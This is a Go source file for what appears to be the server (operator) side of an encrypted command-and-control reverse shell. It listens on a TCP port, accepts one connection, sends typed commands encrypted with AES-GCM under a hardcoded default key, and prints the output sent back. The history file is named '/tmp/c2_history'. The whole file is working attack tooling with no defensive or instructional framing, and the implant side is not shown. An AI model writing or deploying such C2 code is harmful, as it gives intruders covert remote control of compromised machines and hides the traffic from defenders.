// server.go
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/binary"
	"flag"
	"fmt"
	"io"
	"log"
	"net"

	"github.com/chzyer/readline"
)

var (
	addr = flag.String("addr", ":9000", "server listen address")
	key  = flag.String("key", "0123456789abcdef0123456789abcdef", "32-byte AES key")
)

func encrypt(plain []byte, block cipher.Block) ([]byte, error) {
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, plain, nil), nil
}

func decrypt(data []byte, block cipher.Block) ([]byte, error) {
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	n := gcm.NonceSize()
	if len(data) < n {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, ct := data[:n], data[n:]
	return gcm.Open(nil, nonce, ct, nil)
}

func handleSession(conn net.Conn, block cipher.Block) {
	defer conn.Close()
	log.Printf("[+] Session from %s", conn.RemoteAddr())

	// readline for clean input
	rl, err := readline.NewEx(&readline.Config{
		Prompt:          "shell> ",
		HistoryFile:     "/tmp/c2_history",
		InterruptPrompt: "\n",
		EOFPrompt:       "exit",
		HistorySearchFold:   true,
		DisableAutoSaveHistory: false,
	})
	if err != nil {
		log.Fatalf("readline init: %v", err)
	}
	defer rl.Close()

	// send loop
	go func() {
		for {
			line, err := rl.Readline()
			if err != nil {
				return // e.g., Ctrl-D or exit
			}
			cmd := line
			if cmd == "" {
				continue
			}
			// exit command
			if cmd == "exit" {
				enc, _ := encrypt([]byte(cmd), block)
				head := make([]byte, 4)
				binary.BigEndian.PutUint32(head, uint32(len(enc)))
				conn.Write(head)
				conn.Write(enc)
				return
			}
			enc, err := encrypt([]byte(cmd), block)
			if err != nil {
				log.Printf("encrypt error: %v", err)
				continue
			}
			head := make([]byte, 4)
			binary.BigEndian.PutUint32(head, uint32(len(enc)))
			conn.Write(head)
			conn.Write(enc)
		}
	}()

	// receive loop
	for {
		var head [4]byte
		if _, err := io.ReadFull(conn, head[:]); err != nil {
			break
		}
		sz := binary.BigEndian.Uint32(head[:])
		buf := make([]byte, sz)
		if _, err := io.ReadFull(conn, buf); err != nil {
			break
		}
		plain, err := decrypt(buf, block)
		if err != nil {
			log.Printf("decrypt error: %v", err)
			continue
		}
		// Print response
		fmt.Print(string(plain))
	}
	log.Println("Session closed")
}

func main() {
	flag.Parse()
	raw := []byte(*key)
	if len(raw) != 32 {
		log.Fatalf("Key length: %d, want 32", len(raw))
	}
	block, err := aes.NewCipher(raw)
	if err != nil {
		log.Fatalf("AES init: %v", err)
	}

	ln, err := net.Listen("tcp", *addr)
	if err != nil {
		log.Fatalf("listen: %v", err)
	}
	log.Printf("[+] Server listening on %s", *addr)
	conn, err := ln.Accept()
	if err != nil {
		log.Fatalf("accept: %v", err)
	}
	handleSession(conn, block)
}